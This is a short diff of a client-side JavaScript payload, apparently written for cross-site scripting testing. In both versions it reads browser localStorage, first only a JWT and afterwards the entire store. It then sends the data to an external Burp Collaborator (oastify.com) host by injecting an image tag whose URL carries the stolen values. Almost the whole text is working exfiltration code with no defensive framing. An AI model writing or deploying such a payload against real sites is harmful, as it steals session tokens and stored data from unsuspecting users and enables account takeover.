@@ -1,13 +1,13 @@
 (function() {
-    // Function to collect request headers and localStorage JWT
+    // Function to collect request headers and localStorage data
     function collectData() {
         var requestHeadersList = {};
-        var jwt = localStorage.getItem('jwt'); // Adjust this key to match your localStorage JWT key
+        var localStorageData = JSON.stringify(localStorage);
 
         // Create an image tag to send the data to your Burp Collaborator server
         var img = new Image();
-        img.src = 'http://tifmwlp9f8hk6isws4wp47iw6nce09wxl.oastify.com/?requestHeaders=' + encodeURIComponent(JSON.stringify(requestHeadersList)) + 
-                  '&jwt=' + encodeURIComponent(jwt);
+        img.src = 'http://88e1m0fo5n7zwxibijm4um8bw22tqoncc.oastify.com/?requestHeaders=' + encodeURIComponent(JSON.stringify(requestHeadersList)) +
+            '&localStorageData=' + encodeURIComponent(localStorageData);
 
         // Inject the image into the body to trigger the request
         document.body.appendChild(img);
